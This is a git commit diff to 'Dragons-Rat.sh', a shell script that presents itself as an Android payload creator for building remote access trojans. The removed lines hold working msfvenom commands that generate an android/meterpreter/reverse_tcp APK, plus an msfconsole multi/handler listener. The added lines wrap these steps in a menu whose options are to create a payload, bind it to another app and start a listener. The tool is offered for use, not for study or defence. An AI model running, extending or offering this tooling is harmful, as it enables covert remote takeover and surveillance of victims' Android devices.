843b04cb36136b1bc0c4182daf8e81d1f3ec7983
WebDragon <117004849+webdragon63@users.noreply.github.com>
2025-02-02 12:34:54 +0530

    Update Dragons-Rat.sh

--- Dragons-Rat.sh
+++ Dragons-Rat.sh
@@ -17,63 +17,44 @@ clear
 
 echo "Required Packages Has Been Installed Sucessfully"
 
+# Function to display the menu
+show_menu() {
+    clear
+    echo -e "\033[0;37m"
+echo "      ____  ____      _    ____  ___  _   _ ____        ____      _  _____ "
+echo "     |  _ \|  _ \    / \  / ___|/ _ \| \ | / ___|      |  _ \    / \|_   _|"
+echo "     | | | | |_) |  / _ \| |  _| | | |  \| \___ \ _____| |_) |  / _ \ | |  "
+echo "     | |_| |  _ <  / ___ \ |_| | |_| | |\  |___) |_____|  _ <  / ___ \| |  "
+echo "     |____/|_| \_\/_/   \_\____|\___/|_| \_|____/      |_| \_\/_/   \_\_|  "
+echo -e "\033[0;31m     ____________________A SIMPLE PAYLOAD CREATOR TOOL_____________________"
+echo -e "\033[0;29m                               FOR ANDROID ONLY"
+    echo -e "\033[0;37m                           MADE BY:INDIAN CYBER ARMY"
+    echo -e "\033[0;34m          YOUTUBE CHANNEL: https://www.youtube.com/@indiancyberarmy5"
+    echo -e "\033[0;29m"
+    echo -e "\033[0;37m [1]\033[0;29m Create A Payload"
+    echo -e "\033[0;37m [2]\033[0;29m Bind A Payload"
+    echo -e "\033[0;37m [3]\033[0;29m Create A Listener For A Previous Payload"
+    echo -e "\033[0;37m [0]\033[0;31m EXIT"
+    echo -e "\033[0;36m"
+    echo -n " Please select an option: "
+}
 
-clear
-cat<< EOF
-      ____  ____      _    ____  ___  _   _ ____        ____      _  _____ 
-     |  _ \|  _ \    / \  / ___|/ _ \| \ | / ___|      |  _ \    / \|_   _|
-     | | | | |_) |  / _ \| |  _| | | |  \| \___ \ _____| |_) |  / _ \ | |  
-     | |_| |  _ <  / ___ \ |_| | |_| | |\  |___) |_____|  _ <  / ___ \| |  
-     |____/|_| \_\/_/   \_\____|\___/|_| \_|____/      |_| \_\/_/   \_\_|  
-                                                                           
-     ____________________A SIMPLE PAYLOAD CREATOR TOOL_____________________
-                               
-                               FOR ANDROID ONLY
-                           MADE BY: INDIAN CYBER ARMY                  
-            YOUTUBE CHANNEL: https://www.youtube.com/@indiancyberarmy5 
-         
-         
-EOF
-read -p " a) Create a payload
- b) Execute the listener for previous R.A.T
- enter a or b (Default a) ===> " ab
-case $ab in
-a) echo Creating a payload ...;;
-b) echo Executing the listener ...;
-bash src/src.sh
+# Function to handle the user's selection
+handle_choice() {
+    case $1 in
+        1) bash src/fun_a.sh;;
+        2) bash src/fun_b.sh;;
+        3) bash src/fun_c.sh;;
+        0) echo "Exiting..."; exit 0;;
+        *) echo "Invalid option";;
+    esac
+}
 
-esac
-
-read -p "    Enter your IP Address ===> " ip
-read -p "    Enter listener port ===> " Port  
-read -p "|---Set the name and path to save the payload
-|----> " Path               
-msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$Port - apk -o $Path
-clear
-cat<< EOF
-      ____  ____      _    ____  ___  _   _ ____        ____      _  _____ 
-     |  _ \|  _ \    / \  / ___|/ _ \| \ | / ___|      |  _ \    / \|_   _|
-     | | | | |_) |  / _ \| |  _| | | |  \| \___ \ _____| |_) |  / _ \ | |  
-     | |_| |  _ <  / ___ \ |_| | |_| | |\  |___) |_____|  _ <  / ___ \| |  
-     |____/|_| \_\/_/   \_\____|\___/|_| \_|____/      |_| \_\/_/   \_\_|  
-                                                                           
-     ____________________A SIMPLE PAYLOAD CREATOR TOOL_____________________
-                               
-                               FOR ANDROID ONLY
-                           MADE BY: INDIAN CYBER ARMY                  
-            YOUTUBE CHANNEL: https://www.youtube.com/@indiancyberarmy5 
-         
-         
-EOF
-read -p "Do you want to Execute the listener?
- y) Execute the listener
- n) Exit 
- enter y or n (Default y) ===> " yn
-case $yn in
-y) echo Executing the listener ...;;
-n) echo exiting ...;
-sleep 1
-exit 1
-
-esac
-msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip; set lport $Port; exploit;"
+# Main loop to show the menu and handle choices
+while true; do
+    show_menu
+    read choice
+    handle_choice $choice
+    echo -e "\nPress any key to return to the menu..."
+    read -n 1
+done
